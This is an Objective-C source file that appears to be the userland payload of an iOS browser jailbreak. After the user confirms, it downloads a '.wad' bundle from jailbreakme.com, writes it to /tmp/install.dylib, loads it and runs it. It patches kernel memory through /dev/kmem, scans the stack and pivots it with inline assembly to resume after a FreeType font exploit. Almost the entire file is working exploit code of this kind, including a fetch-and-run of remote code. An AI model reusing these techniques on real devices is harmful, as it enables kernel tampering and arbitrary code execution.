#include <stdlib.h>
#import <dumpedUIKit/UIAlertView.h>
#import <dumpedUIKit/UIApplication.h>
#import <dumpedUIKit/UIImageView.h>
#import <dumpedUIKit/UIColor.h>
#import <dumpedUIKit/UIWindow.h>
#import <dumpedUIKit/UIProgressBar.h>
#import <Foundation/Foundation.h>
#import <IOKit/IOKitLib.h>
#include <mach/mach.h>
#include <assert.h>
#include <pthread.h>
#include <dlfcn.h>
#include <CommonCrypto/CommonDigest.h>
#include <CoreGraphics/CoreGraphics.h>
#include <fcntl.h>
#include "common.h"
#include "dddata.h"

@interface Dude : NSObject {
    UIAlertView *progressAlertView;
    UIAlertView *choiceAlertView;
    UIProgressBar *progressBar;
    NSMutableData *wad;
    long long expectedLength;
    const char *freeze;
    int freeze_len;
    unsigned char *one;
    unsigned int one_len;
}
@end

static Dude *dude;

@implementation Dude
- (id)initWithOne:(unsigned char *)one_ oneLen:(int)one_len_ {
    if(self = [super init]) {
        one = one_;
        one_len = one_len_;
    }
    return self;
}

static void unpatch() {
    int fd = open("/dev/kmem", O_RDWR);
    if(fd <= 0) goto fail;
    unsigned int things[2] = {1, 2}; // original values of staticmax, maxindex
    if(pwrite(fd, &things, sizeof(things), CONFIG_MAC_POLICY_LIST + 8) != sizeof(things)) goto fail;
    close(fd);
    return;
fail:
    NSLog(@"Unpatch failed!");
}

static void set_progress(float progress) {
    [dude performSelectorOnMainThread:@selector(setProgress:) withObject:[NSNumber numberWithFloat:progress] waitUntilDone:NO];
}

- (void)setProgress:(NSNumber *)progress {
    [progressBar setProgress:[progress floatValue]];
}

- (void)doStuff {
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    void *handle = dlopen("/tmp/install.dylib", RTLD_LAZY);
    if(!handle) abort();
    void (*do_install)(const char *, int, void (*)(float), unsigned int, unsigned char *, unsigned int) = dlsym(handle, "do_install");

    do_install(freeze, freeze_len, set_progress, CONFIG_VNODE_PATCH, one, one_len);

    NSLog(@"Um, I guess it worked.");
    unpatch();

    [[UIApplication sharedApplication] terminateWithSuccess];
}

- (void)bored {
    if([progressAlertView.message isEqualToString:@"This might take a while."]) {
        progressAlertView.message = @"(*yawn*)";
    }
}

- (void)bored2 {
    if([progressAlertView.message isEqualToString:@"(*yawn*)"]) {
        progressAlertView.message = @"(Come on, it's only a few megabytes!)";
    }
}

- (void)connection:(NSURLConnection *)connection didReceiveResponse:(NSURLResponse *)response {
    expectedLength = [response expectedContentLength];   
}

- (void)connection:(NSURLConnection *)connection didReceiveData:(NSData *)data {
    [wad appendData:data];
    [progressBar setProgress:((float)[wad length])/expectedLength];
}

struct wad {
    unsigned char sha1[20];
    unsigned int first_part_size;
    unsigned char data[];
};

- (void)connectionDidFinishLoading:(NSURLConnection *)connection {
    if([wad length] < sizeof(struct wad)) goto error;
    const struct wad *sw = [wad bytes];
    unsigned char sha1[20];
    CC_SHA1(&sw->first_part_size, [wad length] - 20, sha1);
    if(memcmp(sha1, sw->sha1, 20)) goto error;
    [[[wad subdataWithRange:NSMakeRange(sizeof(struct wad), sw->first_part_size)] inflatedData] writeToFile:@"/tmp/install.dylib" atomically:NO];
    freeze = &sw->data[sw->first_part_size];
    freeze_len = [wad length] - sizeof(struct wad) - sw->first_part_size;
    progressAlertView.title = @"Jailbreaking...";
    progressAlertView.message = @"Sit tight.";
    [progressBar setProgress:0.0];
    [NSThread detachNewThreadSelector:@selector(doStuff) toTarget:self withObject:nil];
    return;
    error:

    [progressAlertView dismissWithClickedButtonIndex:0 animated:YES];
    [progressAlertView release];
    progressAlertView = nil;

    choiceAlertView = [[UIAlertView alloc] initWithTitle:@"Error" message:@"Invalid file received.  Are you on a fail wi-fi connection?" delegate:self cancelButtonTitle:@"Quit" otherButtonTitles:@"Retry", nil];
    [choiceAlertView show];
}

- (void)connection:(NSURLConnection *)connection didFailWithError:(NSError *)error {
    choiceAlertView = [[UIAlertView alloc] initWithTitle:@"Error" message:[error localizedDescription] delegate:self cancelButtonTitle:@"Quit" otherButtonTitles:@"Retry", nil];
    [choiceAlertView show];
}

- (void)alertView:(UIAlertView *)alertView clickedButtonAtIndex:(NSInteger)buttonIndex {
    NSLog(@"alertView:%@ clickedButtonAtIndex:%d", alertView, (int)buttonIndex);

    if(alertView != choiceAlertView) return;
    [choiceAlertView release];
    choiceAlertView = nil;

    if(buttonIndex == 0) {
        // The user hit cancel, just crash.
        unpatch();
        [[UIApplication sharedApplication] terminateWithSuccess];
        return;
    }
    // Okay, we can keep going.
    UIWindow *window = [[UIApplication sharedApplication] keyWindow];
    UIImageView *view = [[UIImageView alloc] init]; // todo
    view.backgroundColor = [UIColor purpleColor];
    [view setHidden:NO];
    view.alpha = 0.0;
    [window addSubview:view];
    view.autoresizingMask = 18;//UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight;
    view.frame = window.bounds;
    [UIView beginAnimations:nil context:nil];
    [UIView setAnimationDuration:1.0];
    view.alpha = 1.0;
    [UIView commitAnimations];
    NSLog(@"window=%@ view=%@", window, view);
    
    progressAlertView = [[UIAlertView alloc] initWithTitle:@"Downloading..." message:@"This might take a while." delegate:nil cancelButtonTitle:nil otherButtonTitles:nil];
    progressBar = [[UIProgressBar alloc] initWithFrame:CGRectMake(92, 95, 100, 10)];
    [progressBar setProgressBarStyle:2];
    [progressAlertView addSubview:progressBar];
    [progressAlertView show]; 
    wad = [[NSMutableData alloc] init];
    [NSURLConnection connectionWithRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:@"http://jailbreakme.com/" CONFIG_PLATFORM ".wad"]] delegate:self];

    [NSTimer scheduledTimerWithTimeInterval:20 target:self selector:@selector(bored) userInfo:nil repeats:NO];
    [NSTimer scheduledTimerWithTimeInterval:40 target:self selector:@selector(bored2) userInfo:nil repeats:NO];
}


- (void)start {
    //[NSThread detachNewThreadSelector:@selector(pipidi:) toTarget:self withObject:port];
    choiceAlertView = [[UIAlertView alloc] initWithTitle:@"Do you want to jailbreak?" message:@"Only do this if you understand the consequences." delegate:self cancelButtonTitle:@"Cancel" otherButtonTitles:@"Jailbreak", nil];
    [choiceAlertView show];
}
@end

__attribute__((noinline))
void foo() {
    asm("");
}

void iui_go(unsigned char **ptr, unsigned char *one, unsigned int one_len) {
    NSLog(@"iui_go");
    dude = [[Dude alloc] initWithOne:one oneLen:one_len];
    [dude performSelectorOnMainThread:@selector(start) withObject:nil waitUntilDone:NO];

    // hmm.
    NSLog(@"ptr = %p; *ptr = %p; **ptr = %u", ptr, *ptr, (unsigned int) **ptr);
    **ptr = 0x0e; // endchar

    // get a return value.
    CGMutablePathRef path = CGPathCreateMutable();
    // mm.    
    unsigned int *addr = pthread_get_stackaddr_np(pthread_self());
    NSLog(@"addr = %p", addr);
    while(*--addr != 0xf00df00d);
    NSLog(@"foodfood found at %p", addr);
    while(!(*addr >= CONFIG_FT_PATH_BUILDER_CREATE_PATH_FOR_GLYPH && *addr < CONFIG_FT_PATH_BUILDER_CREATE_PATH_FOR_GLYPH + ((CONFIG_FT_PATH_BUILDER_CREATE_PATH_FOR_GLYPH & 1) ? 0x200 : 0x400))) addr++;
    NSLog(@"Now we want to return to %p - 7", addr);
    foo();
    addr -= 7;
    asm("mov sp, %0; mov r0, %1; pop {r8, r10, r11}; pop {r4-r7, pc}" ::"r"(addr), "r"(path));

}
